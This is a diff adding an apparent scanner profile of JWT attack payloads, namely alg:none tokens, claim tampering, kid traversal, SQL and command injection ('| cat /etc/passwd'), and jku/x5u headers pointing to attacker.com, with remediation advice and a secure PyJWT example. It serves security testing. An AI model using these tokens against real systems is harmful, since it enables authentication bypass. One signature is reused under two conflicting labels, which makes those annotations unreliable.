@@ -1,0 +1,171 @@
+# JWT Token Manipulation Attack Profile
+# This file defines payloads for testing JWT vulnerabilities
+
+name: "JWT Token Manipulation"
+category: "authentication"
+severity: "critical"
+description: "Tests for common JWT manipulation techniques including algorithm confusion, signature stripping, claim tampering, and key confusion"
+
+# Fields commonly vulnerable to JWT manipulation
+target_fields:
+  - "Authorization"
+  - "token"
+  - "jwt"
+  - "access_token"
+  - "api_key"
+  - "session"
+  - "bearer"
+
+success_indicators:
+  - "token accepted"
+  - "privilege escalation"
+  - "different user data returned"
+  - "server error disclosing internal details"
+  - "authentication bypass"
+
+# Attack payloads to test
+payloads:
+  # --- Algorithm Confusion (alg: none) ---
+  # Header: {"alg":"none","typ":"JWT"}
+  # Payload: {"sub":"1234567890","name":"admin","admin":true}
+  # Note: Signature is stripped
+  - "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9."
+  - "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9"
+
+  # --- Algorithm Confusion (alg: HS256 on RS256 endpoint) ---
+  # Header: {"alg":"HS256","typ":"JWT"}
+  # Payload: {"sub":"1234567890","name":"admin","admin":true}
+  # Signature: Signed with public key as HMAC secret (simulated)
+  - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
+  
+  # --- Signature Stripping ---
+  # Just the Header + Payload without signature part
+  - "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9."
+
+  # --- Claim Tampering (admin: true) ---
+  # Modified payload to set admin=true
+  # Note: Likely invalid signature unless signature check is skipped
+  - "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9.invalid_signature"
+
+  # --- Claim Tampering (role: admin) ---
+  # Payload: {"sub":"1234567890","role":"admin"}
+  - "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.invalid_signature"
+
+  # --- Claim Tampering (expiration bypass) ---
+  # Payload: {"sub":"1234567890","exp":9999999999}
+  - "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiZXhwIjo5OTk5OTk5OTk5fQ.invalid_signature"
+
+  # --- Key Confusion (kid injection) ---
+  # Header: {"alg":"HS256","typ":"JWT","kid":"../../../../../../dev/null"}
+  # Uses directory traversal to point to a file with known content (empty) as key
+  - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9.AA=="
+
+  # --- Key Confusion (JKU Header Injection) ---
+  # Header: {"alg":"RS256","typ":"JWT","jku":"http://attacker.com/key.json"}
+  - "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly9hdHRhY2tlci5jb20va2V5Lmpzb24ifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9.invalid_signature"
+
+  # --- Key Confusion (X5U Header Injection) ---
+  # Header: {"alg":"RS256","typ":"JWT","x5u":"http://attacker.com/cert.pem"}
+  - "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHA6Ly9hdHRhY2tlci5jb20vY2VydC5wZW0ifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9.invalid_signature"
+
+  # --- Token Reuse (Expired Token) ---
+  # Payload: {"sub":"1234567890","exp":1516239022} (Date: 2018-01-18)
+  - "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiZXhwIjoxNTE2MjM5MDIyfQ.invalid_signature"
+
+  # --- Null Byte Injection in Key ID ---
+  # Header: {"alg":"HS256","typ":"JWT","kid":"key.txt\u0000"}
+  - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImtleS50eHRcdTAwMDAifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9.invalid_signature"
+
+  # --- SQL Injection in Key ID ---
+  # Header: {"alg":"HS256","typ":"JWT","kid":"' UNION SELECT 'key'--"}
+  - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IicgVU5JT04gU0VMRUNUICdrZXknLS0ifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9.invalid_signature"
+
+  # --- Command Injection in Key ID ---
+  # Header: {"alg":"HS256","typ":"JWT","kid":"| cat /etc/passwd"}
+  - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InwgY2F0IC9ldGMvcGFzc3dkIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9.invalid_signature"
+
+  # --- Header Parameter Pollution ---
+  # Header: {"alg":"HS256","typ":"JWT","alg":"none"}
+  - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImFsZyI6Im5vbmUifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9."
+
+  # --- Empty JSON Payload ---
+  # Header: {"alg":"none","typ":"JWT"} Payload: {}
+  - "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.e30."
+
+  # --- None Algorithm with Capitalization ---
+  # Header: {"alg":"None","typ":"JWT"}
+  - "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9."
+
+  # --- None Algorithm with Mixed Case ---
+  # Header: {"alg":"nOnE","typ":"JWT"}
+  - "eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9."
+  
+  # --- JSON Array as Payload ---
+  # Header: {"alg":"none","typ":"JWT"} Payload: ["admin"]
+  - "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.WyJhZG1pbiJd."
+
+  # --- Weak Secret 'secret' (HMAC) ---
+  # Signed with 'secret' using HS256
+  - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
+
+  # --- Weak Secret 'password' (HMAC) ---
+  # Signed with 'password' using HS256
+  - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9.Bf6e1oNQgkVHyrVYydTp0Z13O0GbSO890XKW41KSd8E"
+
+remediation: |
+  # Secure JWT Implementation Guidelines
+
+  1. **Strict Algorithm Verification:**
+     Explicitly allow only expected algorithms (e.g., RS256).
+     Reject 'none' algorithm.
+
+  2. **Signature Verification:**
+     Always verify the signature before trusting claims.
+     Do not decode without verification.
+
+  3. **Strong Secret Management:**
+     Use strong, long, random secrets for HMAC.
+     Rotate keys regularly.
+
+  4. **Claim Validation:**
+     Validate 'exp' (expiration), 'nbf' (not before), 'iss' (issuer), and 'aud' (audience).
+     Ensure 'sub' (subject) exists and is valid.
+
+  5. **Header Validation:**
+     Validate 'typ' is JWT.
+     Do not trust 'kid', 'jku', or 'x5u' headers blindly; whitelist allowed keys/URLs.
+
+  # PyJWT Example (Secure)
+
+  import jwt
+  import logging
+  from jwt.exceptions import InvalidTokenError
+
+  def verify_token(token, public_key):
+      try:
+          # decode() verifies signature by default
+          payload = jwt.decode(
+              token,
+              public_key,
+              algorithms=["RS256"],  # Explicitly allow only RS256
+              options={
+                  "require": ["exp", "iss", "sub"],
+                  "verify_exp": True,
+                  "verify_iss": True,
+                  "verify_aud": True
+              },
+              issuer="https://my-auth-server.com",
+              audience="my-api"
+          )
+          return payload
+      except InvalidTokenError as e:
+          # Log error and return generic unauthorized message
+          logging.error(f"Token validation failed: {str(e)}")
+          return None
+
+references:
+  - "https://owasp.org/www-community/vulnerabilities/JSON_Web_Token_Vulnerabilities"
+  - "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/"
+  - "https://datatracker.ietf.org/doc/html/rfc8725"
+  - "https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology"
+  - "https://cwe.mitre.org/data/definitions/347.html"
